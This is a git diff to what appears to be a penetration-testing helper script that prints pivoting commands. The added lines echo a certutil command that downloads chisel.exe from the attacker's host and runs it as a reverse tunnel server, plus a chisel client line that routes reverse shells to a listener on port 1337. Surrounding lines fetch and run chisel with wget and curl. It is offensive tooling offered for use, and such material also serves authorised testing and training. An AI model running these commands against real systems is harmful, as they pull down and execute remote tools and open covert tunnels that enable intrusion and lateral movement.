@@ -71,6 +71,10 @@ echo "wget -O /tmp/chisel http://$LHOST:$TOOLS_PORT/pivoting/chisel/linux/chisel
 echo
 echo "curl -L -o /tmp/chisel http://$LHOST:$TOOLS_PORT/pivoting/chisel/linux/chisel && chmod +x /tmp/chisel && /tmp/chisel client $LHOST:8888 R:1080:socks"
 echo
+echo "# Send our reverse shells to the pivot machines IP using port 8080 which would hit our listener on kali over port 1337"
+echo "certutil.exe -urlcache -f http://$LHOST:$TOOLS_PORT/pivoting/chisel/windows/chisel.exe C:\Windows\Temp\chisel.exe && C:\Windows\Temp\chisel.exe server -p 8888 --reverse"
+echo "chisel client <target>:8888 R:8080:127.0.0.1:1337"
+echo
 echo
 
 echo '********** Reverse-SSH (password is password) 🚀**********'
